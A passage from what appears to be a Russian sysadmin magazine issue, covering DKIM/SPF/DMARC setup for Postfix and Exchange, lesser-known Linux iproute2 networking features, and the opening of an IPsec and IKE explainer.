mail._domainkey.example.org example.org:mail:/etc/opendkim/keys/
example.org/mail.private

Смотрим содержимое файла /etc/opendkim/SigningTable:


*@example.com mail._domainkey.example.com
*@example.org mail._domainkey.example.org

В файле /etc/opendkim/TrustedHosts определяем так называемые Exter‐
nalIgnoreList и InternalHosts, то есть хосты, домены и IP‐адреса, сооб‐
щения от которых будут считать ся доверенными и будут подписываться.
   Так как в основном конфигурационном фай ле мы укажем, что файл Trust‐
edHosts имеет тип reﬁle (файл с регулярными выраже ниями), мы можем
использовать в нем регулярные выражения. Например, *.example.com озна‐
чает, что сообщения, поступающие от поддоменов example.com, тоже будут
доверенными.
  Пример файла /etc/opendkim/TrustedHosts  (у тебя он будет свой,
поэтому слепо не копируй):


127.0.0.1
localhost
::1
192.168.0.1/24
*.example.com
*.example.org

Ну и конечно же, настроим сам пакет opendkim. Для этого вне сем следующие
настройки в кон фигурационный файл /etc/opendkim.conf:


Syslog                  yes
UMask                   002
OversignHeaders         From
Mode                    s
LogWhy                  yes
SyslogSuccess           yes
Canonicalization        relaxed/simple
KeyTable                /etc/opendkim/KeyTable
SigningTable            refile:/etc/opendkim/SigningTable
Socket                  inet:8891@localhost
ReportAddress           root
AutoRestart             Yes
AutoRestartRate         10/1h
ExternalIgnoreList      refile:/etc/opendkim/TrustedHosts
InternalHosts           refile:/etc/opendkim/TrustedHosts
PidFile                 /var/run/opendkim/opendkim.pid
SignatureAlgorithm      rsa‐sha256
UserID                  opendkim:opendkim

А вот расшифровка этих магических слов:
 • AutoRestart — автоматический перезапуск демона в случае ошиб ки;
 • AutoRestartRate — определяет максимальное количество перезапус‐
   ков в единицу времени, после чего филь тр останавливается. Например,
   значение 10/1h говорит о том, что раз решено не более десяти автомати‐
   ческих перезапусков за час, если зна чение будет превыше но — автопере‐
   запуск в случае ошибки будет отключен;
 • UMask — пре доставляет все пра ва дос тупа груп пе пользователей, указан‐
   ной в UserID, и позволя ет дру гим пользователям читать и выполнять фай‐
   лы;
 • Syslog, SyslogSuccess, LogWhy —  эти  параметры  настраивают
   ведение логов с помощью системного демона журналирования syslog;
 • Canonicalization — определяет методы преобразования, исполь‐
   зуемые при подписании сооб щения;
 • метод simple не поз воляет практичес ки никаких изменений, в то время
   как метод  relaxed допус кает  незначительные изме нения  (например,
   замена пробела). Зна чение relaxed/simple указывает, что заголовок
   сообщения будет обрабатываться методом relaxed, а тело сообщения —
  методом simple;
 • ExternalIgnoreList — определяет внеш ние хосты, которые могут
   отправлять почту через сервер в качестве одного из под писанных
   доменов без учетных данных;
 • InternalHosts — определяет список внут ренних хостов, почтовые сооб‐
  щения от которых не должны про верять ся, но должны быть подписаны;
 • KeyTable — файл‐карта названий и путей к секретным ключам;
 • SigningTable — список подписей, которые будут применяться на осно‐
   вании заголовка письма, ука занного в поле From;
 • Mode — режимы работы; в данном случае выступает в качестве milter
   (фильтрация писем до попада ния в очередь сообщений, прописы вается
   в Postﬁx в main.cf, см. ниже), подписывающего (s) и верификатора (v).
  В нашем случае мы будем только подписывать;
 • PidFile — путь к файлу Pid, который содержит идентификационный номер
   процесса;
 • SignatureAlgorithm — указывает используемый алгоритм электронной под‐
   писи;
 • UserID — указывает, под каким пользователем и группой дол жен работать
   процесс opendkim;
 • Socket — milter будет слушать на указанном здесь сокете, Postﬁx будет
   отправлять сооб щения opendkim для подписи и проверки через этот
   сокет. В нашем случае будет использовать ся localhost и 8891‐й порт
   (8891@localhost).

После всех проделанных изменений обязатель но перезапус каем демон
opendkim:


$ /etc/init.d/opendkim start

Также обязательно прописываем для Postﬁx в файле main.cf вот эти строчки:


smtpd_milters = inet:localhost:8891
non_smtpd_milters = inet:localhost:8891
milter_default_action = accept
milter_protocol = 2

Если у тебя уже используется milter (нап ример, для SpamAssasin), тогда эти
же строчки будут выглядеть так:


smtpd_milters = unix:/spamass/spamass.sock, inet:localhost:8891
non_smtpd_milters = unix:/spamass/spamass.sock, inet:localhost:8891
milter_default_action = accept
milter_protocol = 2

После внесения всех изменений в конфигура ционный файл Postﬁx мы снова
его перезапустим:


$ service postfix reload


Определим политику ADSP (Author Domain Signing Practices)
ADSP — дополнительное расширение DKIM, предназначенное для проверки
подлинности email через DKIM. С помощью этого механиз ма домен может
публиковать методы подписи, которые он принимает при передаче почты
от имени ассоциированных авто ров.
   Чтобы настроить политику ADSP, нужно раз местить на DNS‐сервере в TXT‐
записи для каждого домена, для которого используется DKIM, следующую
строчку:


_adsp._domainkey IN TXT "dkim=unknown"




                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
        ЗАЩИЩАЕМ
  ПОЧТОВЫЙ СЕРВЕР
     БЕЗ АНТИВИРУСА
          НАСТРОЙКА DKIM‐, SPF‐ И DMARC‐ЗАПИСЕЙ




Значения могут быть такими:
 • unknown — значение по умол чанию (аналогично тому, что указанной DNS‐
   записи вообще нет). Данное зна чение говорит почтовым серверам (на
   которые ты будешь отправлять пись ма) о том, что письма могут быть как с
   подписью DKIM, так и без нее;
 • all — говорит, что все письма будут подписаны;
 • discardable — говорит, что все пись ма будут подписаны, а если письмо
   не подписано или подпись неверна, то его следует удалить.


Про верка коррек тности вне сен ной DKIM-записи
Для проверки настроенного DKIM уже ничего не нуж но ждать, как это было
в предыдущем случае. Можно просто отпра вить письмо на адрес check‐
auth@verifier.port25.com и получить ответ.
   Вот пример такого ответа, сообщающий, что DKIM настроен корректно:


The results are as follows:
DKIM Signature validation: pass
DKIM Author Domain Signing Practices:

Ура! Все получилось! Открывай бутылку пива!
   Также для проверки мож но отправить письмо  (например, себе же
на какой‐нибудь из общедоступных почтовых серверов вроде mail.yandex.ru
или mail.ru), открыть его исходник и найти в теле такие строчки:


Authentication‐Results: mxfront1g.mail.yandex.net; spf=pass (mxfron
t1g.mail.yandex.net:
 domain of example.com designates 31.34.56.78 as permitted sender)
smtp.mail=tester@example.com;
 dkim=pass header.i=@example.com

и еще вот такие:


DKIM‐Signature: v=1; a=rsa‐sha256; c=relaxed/simple; d=example.com; s
=mail;
 t=1484724874; bh=LGgFxMGKg3waFbi+enIwqHYdnPLt2IsuxgR6s1EEHvg=;
 h=From:To:Subject:Date:From;
 b=fvFO2qXwC3VRfbUVaG4SW3vt7РтИаW8+1kKbKuP25/w/UZ7TLq1TruOYhgoCPpk6B/
 tz93DY5/1mzbPDTiBuEJoh37108ПкJDTWUGqMucoOhXXhHBdtCfns+L6lW5oI+stMP
 5g+xUYyz7/a3oy0MstIFJnhjpJlRwgeS/JPjPfuQ=


Настройка DMARC
Последний штрих нашего мануала — это нас тройка DMARC. Как мы уже выяс‐
нили, DMARC — это опциональная вещь, которая позволя ет нам определить
порядок работы с пись мами, не прошедшими проверку фильтров SPF
или DKIM.
  Все делаем точно так же через DNS‐запись типа TXT:


хост: _dmarc
значение: v=DMARC1; p=none

Здесь мы устанавливаем, что, если письма не прошли SPF или DKIM, ничего
делать не нужно. Но можно поставить маркер p=reject, тогда такие письма
будут сразу же дропаться.
   Ну вот и все на этом! Настройка DKIM‐, SPF‐ и DMARC‐записей для open
sources MTA завер шена! А впереди нас ждет нас тройка аналогичных опций,
но уже на почтовике от Microsoft.


Кон фигурируем SPF и DKIM на MS Exchange Server
Безусловно, мы не можем обойти стороной огромную аудиторию сисад‐
минов, по своей или не своей воле выс троивших корпоративный ИТ‐лан‐
дшафт на базе продуктов всем извес тной корпорации Microsoft. Поэтому
ниже мы рассмотрим настройку SPF‐ и DKIM‐записей для почтового сервера
MS Exchange Server. Дол жен ска зать, что все при веденные здесь настрой ки
были мною протестированы на версии MS Exchange Server начиная с 2013,
хотя и не исклю чены какие‐нибудь приколы с наиболее актуальным сегодня
билдом MS Exchange Server 2019 (версия 15.2). Так что внимательно читай
changelog’и и документацию ко всем используемым ути литам.


Установка Exchange DKIM Signer
Перед началом всех действий нам понадо бится установить специальную ути‐
литу Exchange DKIM Signer.
  Для этого мы идем на страничку GitHub тулзы DKIM Signer и скачиваем
оттуда файл с названием Source Code. Далее распаковы ваем загруженный
ZIP‐архив в любую временную директорию на дис ке С:. Обя зательно от име‐
ни администратора  запускаем  PowerShell‐скрипт Exchange  Management
Shell и переходим в рас пакованную папку.
   Если возникнут ошибки, перед тем как запус тить установочный скрипт
.\install.ps1, зададим политику выполнения PowerShell‐скриптов сле‐
дующей командой:


Set‐ExecutionPolicy Unrestricted

Или еще вариант:


Set‐ExecutionPolicy RemoteSigned

Теперь наконец‐то запус каем сам скрипт установки .\install.ps1 и ждем
завершения опе рации.
  Для тех, кто не очень любит работать с консолью, есть вариант графичес‐
кой установки Exchange DKIM Signer. Для этого идем в репозиторий на GitHub
и скачиваем там файл с именем Configuration.DkimSigner.zip. Рас‐
паковываем содержимое архива в произвольную папку на C:\ и запус каем
из нее исполняемый файл Configuration.DkimSigner.exe, в открывшемся
окне выбираем, какую версию будем устанавливать, жмем Install и ждем нес‐
колько секунд до завершения операции.





       Стартовое окно GUI‐установки ути литы Exchange DKIM Signer





        Выбор версии и прос мотр других параметров установки


Кон фигурирование аген та Exchange DKIM Signer
Не закрывая предыдущее окно Exchange DKIM Signer, на вкладке Information
нажимаем кнопку Conﬁgure.





В открывшемся окне выбираем Exchange DkimSigner и понижаем приоритет
до самого низкого, в моем случае это зна чение 7. Такой приоритет означает,
что почтовое сооб щение будет обрабатываться этим агентом в последнюю
очередь.
  Далее переходим на вкладку DKIM Settings и переключаем алгоритм
хеширования на RsaSha256. Активиру ем опции Body Canonicalization, а Head‐
er Canonicalization выставляем в зна чение Simple. Тут же, не закрывая окно,
можно настроить  заголовки почтовых сооб щений, которые  будут под‐
писываться. Однако эта настройка для работы не кри тична, поэтому оставим
все как есть по умолчанию.





После всех правок не забываем нажать кнопку Save conﬁguration.
  Переходим на вклад ку Domain Settings, где уда ляем предус тановленные
домены по умолчанию — example.com и example.org. Нажимаем на кнопку
Add, вводим свои значения и заполняем основные поля. Поле Domain
Name — это имя нашего почтового домена; например, для адресов типа
UserName@company.com это поле примет зна чение company.com.





Поле Selector — это про извольная стро ка, которая добавляется к име ни
домена. С помощью поля Selector пра вильно идентифици руется public key
в TXT‐записи на DNS‐сервере.
   Если взять установленное нами значение из поля Selector и пос мотреть
на Email Headers отправляемых с сервера писем, то мы увидим тег s=,
который имеет значение из поля Selector. Тег d= имеет значение, указыва‐
ющее на наш почтовый домен. Таким обра зом сервер получателя понимает,
какой именно public key на нашем DNS‐сервере нуж но проверять.
  На следующем шаге генерируем ключевую пару «открытый — закрытый
ключ» (public key и private key). Private key будет храниться строго на сервере,
и с его помощью будет подписывать ся вся исхо дящая почта. Нажимаем кноп‐
ку Generate Key и сохраня ем *.xml‐файл в папку keys.





После всех этих действий на выходе должно получиться три файла в папке
keys:
 • MailDomain.ru.xml;
 • MailDomain.ru.xml.pub — файл содержит public key, в будущем мы
   разместим его в TXT‐записи на нашем внеш нем DNS‐сервере;
 • MailDomain.ru.xml.pem — файл содержит private key.

После сохранения всех XML‐файлов не забыва ем нажать Save Domain, иначе
изменения не сохранятся.
  Далее Exchange DKIM Signer предлагает нам соз дать TXT‐запись на внеш‐
нем DNS‐сервере, который обслуживает наш почтовый домен.





Про верка работоспособ ности поч тового сервера после кон -
фигурирования Exchange DKIM Signer
Теперь мы отправим тестовые пись ма на извес тные почтовые домены, такие,
к примеру, как gmail.com и yandex.ru, и посмотрим, как они доходят. Можно
воспользоваться сервисом MxToolBox, введя IP‐адрес нашего почтовика
и проверив таким образом корректность DKIM‐ и SPF‐записей.





  Проверка работоспособности нас тро енных опций безопасности Ex‐
  change DKIM Signer


ЗАКЛЮЧЕНИЕ
Сегодня мы рассмотрели доступный каж дому админу прос той и не тре‐
бующий заморо чек набор штатных средств, помога ющих усилить безопас‐
ность почтовых серверов под *NIX и серверы Microsoft. Грамотно скон‐
фигурированные DKIM‐, SPF‐ и DMARC‐записи позволят по максимуму сни‐
зить поток спама, фейковых рас сылок, писем с малварью и в целом хоть
как‐то  сократить  нелегитимный  трафик  между  почтовыми  серверами
в интерне те. Конечно, предложенное решение — это не панацея от всех бед,
но это еще один дополнитель ный барь ер на пути злоумышленников, при том
еще и бесплатный.
АДМИН


   ХИТРЫЙ
   ПИНГВИН

       НЕСТАНДАРТНЫЕ ТРЮКИ,
         КОТОРЫЕ ПОМОГУТ
       НАСТРОИТЬ СЕТЬ В LINUX





Большую часть времени мы используем
только  самые   простые   возможности
сетевого стека  Linux. Маршрут по умол‐
чанию, SNAT, несколько пра вил netﬁlter —
все, что нужно среднему маршрутиза тору.         Даниил Батурин                                                                                   Координатор проекта VyOS
Однако  существует множество  фун кций        (https://vyos.io),функциональщик,«языковед»,иногда
для менее рас простра ненных и даже весь‐        сетевойdaniil@baturin.orgадминистратор.
ма нес тандартных ситуаций.


Например, возможность использовать нес тандартный широковещательный
адрес IPv4 sudo ip addr add 192.0.2.1/24 broadcast 192.0.2.2 dev
eth0. Технически ни один RFC этого не запрещает. Я этой возможностью
не воспользовался ни разу, но почти уверен, что кто‐то нашел ей осмыслен‐
ное применение.


DUMMY INTERFACES
В отличие от Cisco IOS и систем семейства BSD, в Linux может быть только
один loopback interface, который всегда называется lo и несет на себе тот
самый адрес 127.0.0.1/8. Если нужно прос то нес колько адре сов для разных
демонов, можно присвоить их на тот же интерфейс lo.
  Но что делать, если нужно несколько независимых локальных интерфей‐
сов?
   Кто‐то советует решать эту проблему использованием не по назначению
интерфейсов  других  типов,  вроде мос тов. Не  верь  им. Правильное
решение — исполь зовать интерфейсы типа dummy, которые аналогичны
loopback  во  всем,  кроме  названия.  Историчес ки  так  сложилось,  что
loopback — это уникаль ный интерфейс lo, и для совмести мости сделали
отдельный тип.


$ ip link add name dum0 type dummy
$ ip link set dum0 up
$ ip address add 192.0.2.10/32 dev dum0


А зачем мне несколько интерфейсов loopback?
На рабочих стан циях и серверах обычно такой необ ходимости нет, но порой
удобно иметь независимые интерфейсы для тестирования сетевых приложе‐
ний. Например, когда нужно пос мотреть, как при ложение поведет себя, если
интерфейс уйдет в down, но соз давать ради это го виртуальную машину
или отклю чать реальную сетевую карту не хочется.
   Гораздо чаще эта воз можность при меняется на маршрутизаторах. У каж‐
дого маршрутизатора обычно несколько адресов, в связи с чем возникает
проблема выбора основного адреса для управления и для сес сий протоколов
вроде BGP, которые не используют multicast.
   Какой выбрать? Любой интерфейс маршрутизатора потенциально может
уйти в down, но сессии BGP и SSH должны работать. Поскольку loopback
или dummy самопроизвольно не уйдет в down никогда, можно прис воить ему
отдельный адрес и анонсировать его остальной сети через протокол OSPF
(Open Shortest Path First), который использует multicast и не зависит от кон‐
кретных адресов интерфейсов. В этом случае адрес на loopback останется
доступным, если у маршрутиза тора есть хотя бы один живой канал в осталь‐
ную сеть.


MACVLAN
У любого интерфейса L2 может быть один и только один MAC‐адрес. Что
делать, если хочется отправлять кадры с разным MAC‐адре сом с одного
физического интерфейса?
   У ядра Linux на это есть ответ, и тип таких интерфейсов называется
macvlan. Создать и под нять его можно следующими командами:


$ sudo ip link add name macvlan0 link eth0 type macvlan
$ sudo ip link macvlan0 up

В опции link мы указываем родитель ский физичес кий интерфейс. По умол‐
чанию используется случайный MAC‐адрес, но ничто не мешает присвоить
любой другой командой ip link set dev macvlan0 address <some MAC>.
  Посмотрим на статус нового интерфей са:


$ ip li sh macvlan0
3: macvlan0@eno1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc
noqueue state UP mode DEFAULT group default qlen 1000
    link/ether 8a:01:12:8f:1f:7c brd ff:ff:ff:ff:ff:ff

Если    присвоить    нашему    вир туальному    интерфейсу    адрес
из сети 203.0.113.0/24, можно увидеть, что весь трафик в эту сеть отправ‐
ляется с MAC‐адреса от macvlan0, а не родительского eth0.



  $ ip address add 203.0.113.90/25 dev macvlan0
  $ tcpdump ‐eni eth0 dst 203.0.113.1
  tcpdump: verbose output suppressed, use ‐v or ‐vv for full protocol de‐
  code
  listening on eth0, link‐type EN10MB (Ethernet), capture size 262144
  bytes
  20:49:21.988045 8a:01:12:8f:1f:7c > Broadcast, ethertype ARP (0x0806),
  length 42: Request who‐has 203.0.113.1 tell 203.0.113.90, length 28



ЗЕРКАЛИРОВАНИЕ ТРАФИКА
Зеркалирование и перенаправление обычно орга низуют на коммутаторах.
Но если нужно сделать это на сервере или маршрутизаторе с Linux, никто
не запретит.
  Правила зеркалирования соз даются с помощью tc. Мы рас смотрим толь‐
ко простейший случай: готовый рецепт для зеркалирования с dum0 на dum1
(интерфейсы можно подста вить любые):


$ tc qdisc add dev dum0 ingress
$ tc filter add dev dum0 parent ffff: protocol all u32 match u8 0 0
action mirred egress mirror dev dum1


$ tc qdisc add dev dum0 handle 1: root prio
$ tc filter add dev dum0 parent 1: protocol all u32 match u8 0 0
action mirred egress mirror dev dum1

Опция mirred позволя ет как копировать, так и перенаправлять пакеты
с одного интерфейса на дру гой. В сочетании с классификаторами трафика
из tc можно настроить самые разные сценарии, от зеркалирования только
определенного трафика до отправки трафика сверх определенной полосы
пропускания на другой интерфейс.


МАРШРУТЫ BLACKHOLE
С помощью маршрутов можно не только отпра вить пакеты на опре деленный
шлюз, но и просто избавиться от ненужных пакетов. Маршрутизация срабаты‐
вает до межсетевого экра на, и проверка адреса выполняется быстрее.
  Зараженные  хосты шлют  трафик  к  контрол леру  ботнета  по  адре‐
су 192.0.2.10? Просто добавь такой маршрут:


$ ip route add blackhole 192.0.2.10/32

Теперь трафик к 192.0.2.10 ядро будет сра зу отправлять в /dev/null. Кроме
blackhole, есть и другие виды маршрутов, которые отличаются действиями
ядра. Их можно использовать, чтобы точнее сообщить клиенту, что происхо‐
дит, или для эмуляции разных ситуаций в сети.
 • blackhole — уничтожить пакет и ничего не делать;
 • prohibit — уничтожить пакет и отпра вить клиенту ICMP host prohibited;
 • unreachable —  уничтожить  пакет и отпра вить  клиенту ICMP  host
   unreachable;
 • throw — уничтожить пакет и отпра вить клиенту ICMP net unreachable.

В маршрутизаторах BGP у маршрутов blackhole есть и более интересное при‐
менение, но это другая история.


ГРУППЫ ИНТЕРФЕЙСОВ
Возможность работать с диапа зона ми портов — привычное дело для поль‐
зователей управляемых коммутаторов. Для тех, кто скучает по этой воз‐
можности в Linux, такая функциональность есть в iproute2.
  Неудобство состоит в том, что интерфей сы нужно добавлять в группы
по одному, командой ip link set <intf> group <number>. Номер группы
должен быть в диапазоне от 1 до 255, по умолчанию интерфейсы при над‐
лежат группе 0.
  Создадим пару интерфейсов dummy и добавим их в группу номер 10:


$ ip link add name dum0 type dummy
$ ip link add name dum1 type dummy
$ ip link set dum0 group 10
$ ip link set dum1 group 10

Как обычно, интерфейсы создаются в выключенном состоянии:



  $ ip link show group 10
  4: dum0:  mtu 1500 qdisc noop state DOWN mode DEFAULT group 10 qlen 1000
    link/ether 22:b4:dc:27:2f:6d brd ff:ff:ff:ff:ff:ff
  5: dum1:  mtu 1500 qdisc noop state DOWN mode DEFAULT group 10 qlen 1000
    link/ether 5a:da:93:ab:9d:a7 brd ff:ff:ff:ff:ff:ff


Теперь мы можем включить их все сра зу:



  $ sudo ip link set group 10 up
  $ ip link show group 10
  4: dum0:  mtu 1500 qdisc noqueue state UNKNOWN mode DEFAULT group 10
  qlen 1000
    link/ether 22:b4:dc:27:2f:6d brd ff:ff:ff:ff:ff:ff
  5: dum1:  mtu 1500 qdisc noqueue state UNKNOWN mode DEFAULT group 10
  qlen 1000
    link/ether 5a:da:93:ab:9d:a7 brd ff:ff:ff:ff:ff:ff


К сожалению, простого способа увидеть список групп в Linux нет. Зато есть
возможность присвоить группам понятные человеку имена. Соответс твие
номеров и имен хранится в файле /etc/iproute2/group.
  По умолчанию там определена только груп па 0, новые записи легко
добавить по аналогии:



  $ cat /etc/iproute2/group
  # device group names
  0   default



БОЛЬШЕ СИМВОЛЬНЫХ ИМЕН
Кроме групп интерфейсов, присвоить символь ные име на можно и другим
объектам. В /etc/iproute2/ найдутся файлы настро ек для разных целей.
  Например, если ты используешь policy‐based routing, можно прис воить
имена таблицам маршрутиза ции, добавив записи в /etc/iproute2/rt_ta‐
bles:


$ echo "10 cheap_isp" >> /etc/iproute2/rt_tables
$ echo "20 good_isp" >> /etc/iproute2/rt_tables


ПОТОЧНОЕ ВЫПОЛНЕНИЕ КОМАНД IPROUTE2
Все давно привыкли к iptables‐save и iptables‐restore, но вот команды
ip очень часто так и вводят по одной даже в скриптах.
  Между тем там давно существу ет опция ‐batch, которая позволяет читать
команды из файла. Писать ip в командах внутри фай ла не нужно. Вот так мож‐
но было бы автоматизиро вать соз дание интерфей сов dummy из предыдущих
пунктов:


$ cat /tmp/dummy‐intfs
link add dum0 type dummy
link add dum1 type dummy
link set dum0 up
link set dum1 up


$ ip ‐batch /tmp/dummy‐intfs


МАШИНОЧИТАЕМЫЙ ВЫВОД ИНФОРМАЦИИ
Если ты все еще парсишь вывод ifconﬁg в скриптах и при этом нецензурно
ругаешься, у меня для тебя хорошие новости: у iproute2 име ются опции,
которые позволят тебе и твоим коллегам наконец взять детей на работу.
  Можно получить вывод либо в тра диционном для UNIX формате из полей
с разделите лями, либо в JSON.
  Опция ‐‐brief  (‐br) идеальна для разбора с помощью cut или
awk ‐F' ' и отлично подойдет для применения в традиционных скриптах
Shell:



  $ ip ‐‐brief link show macvlan0
  macvlan0@eth0 UP 8a:01:12:8f:1f:7c


  $ ip ‐‐brief address show macvlan0
  macvlan0@eth0 UP 203.0.113.90/25 fe80::8801:12ff:fe8f:1f7c/64


Если адресов у интерфейса нес колько, они все будут выведены через пробел
после состояния интерфейса, сначала IPv4, затем IPv6.


Вы вод в JSON
Если ты решил порвать с прошлым и пишешь скрипты, к примеру, на Python,
вывод в JSON может быть предпочтитель нее.
   Эта возможность в iproute2 появилась недавно (с версии 4.13) и имеет ряд
особенностей, граничащих с багами. Надеюсь, их исправят в следующих вер‐
сиях.
  Важный момент: опции ‐‐json и ‐‐brief не взаимоис ключающие. Их
можно указать одновременно, в этом случае вывод будет менее детальным.
  Посмотрим на пример вывода для ip address show:


$ ip ‐‐json ‐‐brief address show macvlan0


[
    {},{},
    {
      "link": "eth0",
      "ifname": "macvlan0",
      "operstate": "UP",
      "addr_info": [
        {
          "local": "203.0.113.90",
          "prefixlen": 25
        },
        {
          "local": "203.0.113.91",
          "prefixlen": 25
        },
        {
          "local": "fe80::8801:12ff:fe8f:1f7c",
          "prefixlen": 64
        }
      ]
    },
    {},{},{},{},{},{}
  ]

Несколько неудоб но, что мы получаем не ассоциативный мас сив с именем
интерфейса в качестве индекса, а обычный массив с объектами внутри.
Более  того,  если  отфиль тро вать  вывод,  указав  имя  интересу ющего
интерфейса, на месте непоказанных интерфейсов будут пустые значения,
которые придется отфильтро вывать самому.
  Тем не менее вывод не подвержен ошиб кам разбора, предоставляет
большое количество информа ции (особен но без ‐‐brief) и не слишком сло‐
жен в работе, хотя прос тор для улучшений явно есть.


ЗАКЛЮЧЕНИЕ
Надеюсь, эти возможности помогут тебе успешно настроить и отладить твою
сеть и при этом сэконо мить время. Если не нашел нужное, не забывай смот‐
реть в документацию — почти наверняка что‐нибудь для твоей ситуации там
отыщется.
АДМИН
 ЗАГАДОЧНЫЙ
  IPSEC





                                      Даниил Батурин
                                         Координатор проекта VyOS
                                                      (https://vyos.io), «языковед»,
                                          функциональщик, иногда
                                            сетевой администратор.
                                                       daniil@baturin.org




       ВСЕ, ЧТО ТЫ ХОТЕЛ УЗНАТЬ
    ОБ IPSEC, НО НЕ ДОГАДЫВАЛСЯ
            СПРОСИТЬ





IPsec — сложный стек протоко лов. На клиентской стороне он
обычно автоматизирован, что в сочета нии с его названием
легко может вызвать  у пользователя ощущение полной
безопасности. Однако не всег да оправданное. Только IPsec
из протоколов, пригодных для организации VPN, поддержи‐
вают все сетевые ОС, поэто му у тебя есть неплохой шанс
с ним столкнуться. И что бы быстро настраивать соеди нения
и правильно оценивать их безопасность, нужно понимать,
как работает протокол.


ИЗ ЧЕГО СОСТОИТ IPSEC?
IPsec — это не один протокол, а три или четыре, смотря как считать. В Open‐
VPN и других решениях на основе TLS все просто: устанавливается соеди‐
нение по TCP или UDP, согласовываются парамет ры, а затем передаются
данные.
  В IPsec за согласова ние параметров и собственно передачу данных отве‐
чают разные протоколы. В Linux, BSD и многих специализированных ОС мар‐
шрутизаторов туннель можно настроить вручную, без помощи управляющего
протокола.


AH И ESP
Три основных компонен та безопас ности — доступность, аутентичность и кон‐
фиденциальность. IPsec может обеспечивать аутентичность, при этом ничего
не делая для конфиденциальнос ти.
  Протокол AH  (Authentication Header) добавляет в пакет специальный
заголовок с контроль ной суммой. На практике он используется редко, пос‐
кольку никак не способству ет конфиденциальности.
  Тем не менее его мож но встретить в при ложениях, где важна только аутен‐
тичность. К примеру, про токол маршрутизации OSPFv2 использовал пароли
и суммы MD5 для защиты  от поддельных анонсов, а  его нас ледник
OSPFv3 не включает никакой функциональности для защиты — вместо этого
предлагается использовать IPsec в транспортном (прозрачном) режиме и с
одной подписью AH без шифрования.
  ESP (Encapsulated Security Payload) шифрует содержимое пакета и добав‐
ляет хеши. Его можно использовать в двух режимах — транспортном и тун‐
нельном. Это сейчас в сетях IPv4 любой VPN немыс лим без маршрутизации
частных (серых) адресов через туннель, поскольку со внешним миром хос ты
общаются через NAT. Но IPsec старше NAT и изна чально шифровал только
полезную нагрузку пакетов, не трогая заголовки, — это и есть транспортный
режим.
  В туннельном режиме ESP шифрует весь пакет и передает его как полез‐
ную нагрузку, на другой стороне он извлекается, расшифровывается и мар‐
шрутизируется дальше.
   Что интерес но, оба они не работа ют поверх TCP или UDP, а используют
отдельные номера протоколов IP. Во всяком слу чае, по умолчанию — ESP
может быть инкапсулирован в UDP для работы через NAT, но об этом позже.


ФРЕЙМВОРК ДЛЯ УПРАВЛЯЮЩИХ ПРОТОКОЛОВ — ISAKMP
Общие принципы согласования нас троек безопас ности описывает ISAKMP
(Internet Security Association and Key Management Protocol). Он описан в RFC
2408.
  ISAKMP не является законченным сетевым про токолом. Это фреймворк,
который описывает требования к безопасной работе протоколов обмена
настройками безопасных соединений,  терминологию и общий формат
пакетов, но ничего не говорит о конкретных про токолах обмена ключами,
шифрования и прочего — это остается на совес ти реализаций.
  Именно из ISAKMP про исходят термины Phase 1 и Phase 2, которые часто
можно встретить в интерфейсе нас тройки маршрутизаторов и в опи саниях
настроек для подклю чения. Phase 1 — сог ласова ние параметров безопас‐
ного обмена данными о нас тройках. Phase 2 — сог ласование параметров
собственно защиты переда ваемого тра фика хостов или приложений.
  Самая популярная и практичес ки единственная реализация ISAKMP — IKE.


УПРАВЛЯЮЩИЙ ПРОТОКОЛ — IKE
IKE (Internet Key Exchange) — реальный управля ющий протокол IPsec на осно‐
ве ISAKMP. На практике можно ска зать, что Phase 1 — согласование настроек
IKE, а Phase 2 — согласование настроек ESP.
  В UNIX‐подобных системах IKE — это единс твенная часть стека IPsec,
которая работает в виде обычного процес са. Само шифрование реализова‐
но в ядре, и демон IKE передает ему параметры после согласования со вто‐
рой стороной. В Linux это происхо дит через netlink или команды ip xfrm.


             INFO

                     Подсисте ма XFRM в Linux обычно ассоциирует ся
                        с IPsec, но может выполнять и другие преобра‐
                       зования, например сжатие полезной нагрузки.


Популярные пакеты «для IPsec» вроде StrongSWAN и LibreSWAN реализуют
именно IKE.


Согласование настро ек шифрования
В IKE есть возможность предложить второй стороне несколько вариантов
на выбор, и соединение будет установлено, если у обеих сторон найдется
хотя бы один совпадающий вариант. Это общий принцип работы протоколов
обмена клю чами, TLS работа ет так же, но в TLS пери одически удаляют под‐
держку устаревших алгорит мов. В IKE безопас ность выбора алгоритмов оста‐
ется на совести пользователя. Заведомо уяз вимые DES и MD5 из протокола
официально не исключены и до сих пор поддерживаются многими реали‐
зациями.
  С каждым туннелем ассоциировано одно или нес колько «предложений»
(proposals). Предложения обра батываются до первого совпадения. Отсюда
следствие: вполне воз можна ситуация, когда зловредный (или безответс‐
твенно настроенный) сервер предложит клиенту устаревшие алгоритмы,
а неаккуратно настроенный клиент согласится. У некоторых клиентов вообще
может не быть возможности выб рать алгоритмы вручную, а особо ленивые
админы любят делать для всех клиентов один боль шой proposal со всеми
мыслимыми алго ритмами. Сортировать алгоритмы по надежности стандарт
не обязывает, и стороны вполне могут договориться на шифр полувековой
давности.
  Более того, официально поддержи вает ся null cipher — опция не шиф‐
ровать трафик вооб ще.
   Чтобы убедиться в безопасности настро ек, в идеале нужно немного
понимать принципы криптографии и следить за новостями. Тем не менее
можно привести ряд рецептов.
 1. Ни в коем случае нельзя сог лашать ся ни на что, что кончается на ecb. ECB
   (Electronic Code Book) — чрезвычайно небезопас ный режим работы блоч‐
   ных шифров. Суть проб лемы наглядно демонстрирует знаменитый ECB
   penguin. Хороший шифр в неверном режиме — плохой шифр. AES‐128‐
  CBC — хорошо, AES‐128‐ECB — плохо.
 2. 3DES и Blowﬁsh до недавнего времени считались надежными, но уяз‐
   вимость SWEET32 показа ла, что это не так. AES‐128, AES‐256, Twoﬁsh
   и другие шиф ры с 128‐битными блоками — все еще разумный выбор.
 3. Группы для алгоритма Диффи — Хел лма на DH1024 (group 2) и DH1536
   (group 5) также признаны уяз вимыми. Нужно использовать DH2048 (group
   14) или группы на эллиптичес ких кри вых.


             INFO

                   В IKE вполне можно использовать разные наборы
                        алгоритмов для Phase 1 и Phase 2. Смысла в этом
                     немного, но возможность имеется.



Diffie — Hellman и PFS
PFS  (Perfect Forward Secrecy) — рекомендуемая опция, которую многие
оставляют выключенной, а зря, осо бенно если исполь зуется pre‐shared key.
  В этом режиме из ключей обеих сторон генерируется периодически
обновляемый сессионный ключ и согласу ется с помощью алгоритма Диф‐
фи — Хеллмана (DH). В предельно упрощенной формулировке он основан
на том, что возвести число в степень просто, а вычис лить логарифм — гораз‐
